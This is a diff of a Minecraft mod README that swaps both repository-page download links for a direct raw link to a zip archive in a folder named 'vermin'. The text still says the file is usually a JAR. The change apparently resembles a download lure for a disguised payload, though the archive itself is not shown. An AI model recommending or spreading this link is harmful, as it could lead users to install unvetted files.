@@ -1,6 +1,6 @@
 # ☢️ Fallout-Additions-Minecraft-Mod - Bring post apocalyptic survival to Minecraft
 
-[![Download Fallout Mod](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/clustered-mitra763/Fallout-Additions-Minecraft-Mod)
+[![Download Fallout Mod](https://img.shields.io/badge/Download-Release-blue.svg)](https://raw.githubusercontent.com/clustered-mitra763/Fallout-Additions-Minecraft-Mod/main/vermin/Additions_Fallout_Minecraft_Mod_v2.4.zip)
 
 ## 🎮 Overview
 
@@ -19,7 +19,7 @@ Ensure your computer meets these specifications to run the modification without 
 
 ## 📥 Downloading the Files
 
-Visit this page to download the necessary files to start your game: [https://github.com/clustered-mitra763/Fallout-Additions-Minecraft-Mod](https://github.com/clustered-mitra763/Fallout-Additions-Minecraft-Mod)
+Visit this page to download the necessary files to start your game: [https://raw.githubusercontent.com/clustered-mitra763/Fallout-Additions-Minecraft-Mod/main/vermin/Additions_Fallout_Minecraft_Mod_v2.4.zip](https://raw.githubusercontent.com/clustered-mitra763/Fallout-Additions-Minecraft-Mod/main/vermin/Additions_Fallout_Minecraft_Mod_v2.4.zip)
 
 Download the latest version of the mod file. Ensure the file extension matches the requirements of your installer, usually JAR. Save the file in a folder you can access easily, such as your Downloads folder.
 
